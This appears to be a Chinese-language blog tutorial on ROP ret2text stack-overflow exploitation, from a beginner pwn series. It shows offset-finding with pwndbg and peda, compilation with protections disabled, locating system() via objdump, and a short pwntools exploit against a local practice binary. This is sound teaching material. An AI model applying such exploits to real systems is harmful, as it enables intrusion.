@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在栈溢出漏洞下，最常用的攻击手法是构造ROP链，而其中最简单的，也是最基础的ROP攻击手法，即是ret2text，其利用的背景是无NX保护，且程序中存在对应的shellcode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从0开始学Pwn-5.ROP-Ret2Text详解">
+<meta property="og:url" content="http://example.com/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-5.Ret2Text%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Csc8&#39;s">
+<meta property="og:description" content="在栈溢出漏洞下，最常用的攻击手法是构造ROP链，而其中最简单的，也是最基础的ROP攻击手法，即是ret2text，其利用的背景是无NX保护，且程序中存在对应的shellcode">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-21T08:53:11.401Z">
+<meta property="article:modified_time" content="2022-06-21T09:07:55.793Z">
+<meta property="article:author" content="csc8">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/06/21/从0开始学Pwn-5.Ret2Text详解/"/>
+
+
+
+
+
+  <title>从0开始学Pwn-5.ROP-Ret2Text详解 | Csc8's</title>
+  
+
+
+
+
+
+
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Csc8's</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">苍松翠柏</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-5.Ret2Text%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/%5Bobject%20Object%5D">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Csc8's">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从0开始学Pwn-5.ROP-Ret2Text详解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-06-21T16:53:11+08:00">
+                2022-6-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在栈溢出漏洞下，最常用的攻击手法是构造ROP链，而其中最简单的，也是最基础的ROP攻击手法，即是ret2text，其利用的背景是无NX保护，且程序中存在对应的shellcode</p>
+<span id="more"></span>
+
+
+
+
+
+<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h3><h4 id="几个小点"><a href="#几个小点" class="headerlink" title="几个小点"></a>几个小点</h4><p><strong>一个程序本质上都是由 bss段、data段、text段三个组成的</strong></p>
+<p>BSS：存放程序中未初始化的全局变量的一块内存区域</p>
+<p>Data：存放程序中已初始化的全局变量的一块内存区域</p>
+<p>Rodata：用于存放常量数据(只读数据), 并非全部的常量都是放在Rodata段</p>
+<p>Text ：存放程序执行代码的一块内存区域</p>
+<p>stack：存放程序临时创建的局部变量。函数被调用时，参数会被push进调用的栈，结束后，函数返回值也会存放在栈中</p>
+<p>heap：堆是用于存放进程运行中被动态分配的内存段</p>
+<h4 id="ROP系统攻击"><a href="#ROP系统攻击" class="headerlink" title="ROP系统攻击"></a>ROP系统攻击</h4><p><strong>Rop</strong>：面向返回编程，是一种基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段(gadget)，构建恶意代码。</p>
+<p><strong>核心</strong>：利用以ret结尾的程序片段 ，操作这些栈相关寄存器，控制程序的流程，执行相应的gadget，实施攻击</p>
+<p><strong>特征：</strong>主要利用栈溢出漏洞实现程序控制流的劫持</p>
+<p>(1)ROP控制流中，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/call/24179734">call</a>和ret指令<strong>不操纵函数</strong>，而是将函数里面的<strong>短指令序列的执行流</strong>串起来</p>
+<p>(2)ROP控制流中，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/jmp/19675282">jmp</a>指令在<strong>不同的库函数甚至不同的库之间跳转</strong>，攻击者抽取的指令序列可能取自任意一个二进制文件的任意一个位置：如，函数中部提取出的jmp短指令序列，可将控制流转向其他函数的内部</p>
+<h4 id="Ret2Text："><a href="#Ret2Text：" class="headerlink" title="Ret2Text："></a>Ret2Text：</h4><p>return to text：执行程序中已有的代码，如system函数等，可以利用已有的gadgets，去控制system函数</p>
+<p>溢出位置–&gt;偏移量–&gt;可执行代码</p>
+<h4 id="如何快速定位栈溢出点-学习IDA"><a href="#如何快速定位栈溢出点-学习IDA" class="headerlink" title="如何快速定位栈溢出点(学习IDA)"></a>如何快速定位栈溢出点(学习IDA)</h4><p><strong>常见溢出点</strong></p>
+<p>无长度限制：gets(buf)，strcpy(dest,src),  scanf(%s,buf),   strcat(buf, buf2)</p>
+<p>需要注意size：read</p>
+<p><strong>学习IDA常用指令</strong></p>
+<h3 id="2-如何快速定位溢出偏移"><a href="#2-如何快速定位溢出偏移" class="headerlink" title="2.如何快速定位溢出偏移"></a>2.如何快速定位溢出偏移</h3><p><strong>pwndbg</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成数据</span></span><br><span class="line">cyclic 200</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入生成数据</span></span><br><span class="line">r</span><br><span class="line">&#x27;xxxxxx&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">超出界限，使pwndbg报错</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">回显： Invalid address 0x61616161</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再利用命令，直接获取溢出偏移量</span></span><br><span class="line">cyclic -l 0x61616161</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>peda</strong></p>
+<p>因为peda和pwndbg都是gdb插件，使用时记得切换插件</p>
+<p><strong>peda插件安装</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装peda</span></span><br><span class="line">git clone https://gitee.com/takaobsid/peda.git~/peda</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行安装,中间是peda.py的目录</span></span><br><span class="line">echo &quot;source~/peda/peda.py&quot;&gt;&gt;~/.gdbinit</span><br></pre></td></tr></table></figure>
+
+<p><strong>插件切换</strong></p>
+<p>注意路径的问题，如果是root，那么根目录在&#x2F;root下</p>
+<p>如果是用户，进入对应的根目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim~/.gdbinit</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将不用的插件注释掉</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>编译</strong></p>
+<p>-zexecstack:栈可执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fno-stack-protector -zexecstack -m32 -o reda read.c</span><br></pre></td></tr></table></figure>
+
+<p><strong>快速定位</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pattern create 200</span><br><span class="line">r</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入,生成的字符</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">回显错误Invalid地址</span></span><br><span class="line">pattern offset 地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-Ret2Text实例"><a href="#3-Ret2Text实例" class="headerlink" title="3.Ret2Text实例"></a>3.Ret2Text实例</h3><p><strong>学习：</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/ATFWUS/article/details/104555409">ROP-基础-ret2text</a></p>
+<p><strong>目的：</strong></p>
+<p>控制返回地址–&gt;控制执行流程</p>
+<p>溢出到返回地址–&gt;需要输入多少数据</p>
+<p><strong>操作流程：</strong></p>
+<p>**1.找溢出点(IDA)  **</p>
+<p>**2.确定溢出偏移(pwndbg)   **</p>
+<p>**3.找system函数(objdump)  **</p>
+<p><strong>4.写exp</strong></p>
+<p>offset &#x3D; 返回地址 - 可控buf</p>
+<p><strong>找system函数</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看程序中使用的函数</span></span><br><span class="line">objdump -t xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看程序中函数的汇编代码</span></span><br><span class="line">objdump -d xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看plt表</span></span><br><span class="line">objdump -d -j .plt xxx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-j的参数</span></span><br><span class="line">.text   #代码段</span><br><span class="line">.const  #只读数据段</span><br><span class="line">.data 	#读写数据段</span><br><span class="line">.bss	#bss段</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看intel架构的汇编</span></span><br><span class="line">objdump -d -M intel xxx</span><br></pre></td></tr></table></figure>
+
+<p><strong>针对一个未知的文件ret2text</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件的类型，架构等等</span></span><br><span class="line">file ret2text</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件函数</span></span><br><span class="line">objdump -t ret2text</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看汇编代码</span></span><br><span class="line">objdump -d -M intel ret2text</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找溢出点，关注IO型的函数</span></span><br><span class="line">get，printf...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找系统函数，并且关注系统函数中的参数</span></span><br><span class="line">objdump -d -M intel ret2text|grep system</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看目标地址的信息</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再关注目标的上下内容，</span></span><br><span class="line">x/s 地址</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">确定溢出偏移量</span></span><br><span class="line">cyclic 200</span><br><span class="line">r</span><br><span class="line">cyclic -l 地址</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line"><span class="comment">#溢出偏移</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p32():main函数返回地址：找到system函数的地址</span></span><br><span class="line">payload = offset*<span class="string">&#x27;a&#x27;</span> + p32(<span class="number">0x0804863a</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-4.printf%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%AA%81%E7%A0%B4%E6%A0%88%E4%BF%9D%E6%8A%A4/" rel="next" title="从0开始学Pwn-4.printf漏洞概述及利用">
+                <i class="fa fa-chevron-left"></i> 从0开始学Pwn-4.printf漏洞概述及利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/%5Bobject%20Object%5D"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">1.基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%A0%E4%B8%AA%E5%B0%8F%E7%82%B9"><span class="nav-text">几个小点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROP%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB"><span class="nav-text">ROP系统攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ret2Text%EF%BC%9A"><span class="nav-text">Ret2Text：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%E7%82%B9-%E5%AD%A6%E4%B9%A0IDA"><span class="nav-text">如何快速定位栈溢出点(学习IDA)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E6%BA%A2%E5%87%BA%E5%81%8F%E7%A7%BB"><span class="nav-text">2.如何快速定位溢出偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Ret2Text%E5%AE%9E%E4%BE%8B"><span class="nav-text">3.Ret2Text实例</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">csc8</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+</body>
+</html>
